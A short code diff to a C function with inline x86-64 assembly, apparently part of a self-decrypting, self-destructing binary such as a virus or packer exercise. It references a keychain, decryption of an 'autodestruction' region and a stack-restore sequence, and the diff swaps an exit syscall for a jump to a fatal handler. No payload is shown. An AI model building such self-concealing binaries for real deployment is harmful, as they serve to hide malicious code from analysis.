@@ -8,11 +8,10 @@ void execution(const struct s_host *host, const struct s_keychain *keychain, con
 {
 	if (context != ABORT)
 	{
-		;
+		(void)keychain;
 	}
 //		decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
 
-	(void)keychain;
 	asm volatile
 	(
 	 	"mov rsp, %0\n"
@@ -39,7 +38,6 @@ void execution(const struct s_host *host, const struct s_keychain *keychain, con
 		"pop rbp\n"
 		"pop rsp\n"
 		"add rsp, 0x8\n"
-	 	"mov rax, 0x3c\n"
-		"syscall\n"
+		"jmp _fatal\n"
 	);
 }
